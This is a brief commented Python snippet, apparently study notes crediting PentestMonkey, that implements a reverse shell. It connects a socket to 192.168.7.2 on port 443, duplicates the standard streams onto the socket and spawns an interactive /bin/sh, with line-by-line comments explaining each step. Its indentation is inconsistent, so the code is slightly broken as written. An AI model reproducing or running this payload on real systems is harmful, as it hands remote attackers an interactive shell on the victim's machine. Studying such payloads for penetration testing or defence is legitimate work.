
def linuxShell(): #this defines the next code as the linux shell

    import socket,os,subprocess 
#this imports the socket

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#creates an INET, streaming socket

   s.connect(("192.168.7.2",443))


#connects the socket to the IP address and port

   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
#the os.dup2 section of this shell is essentially the middle man between the shell socket and the shell interaction.

p = subprocess.call(["/bin/sh","-i"])
(PentestMonkey)

#this last bit of code calls the subprocess from a specific location and launches the bash script

(Reference)

(PentestMonkey) https://www.google.co.uk/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=python%20shell%20cheat%20sheet
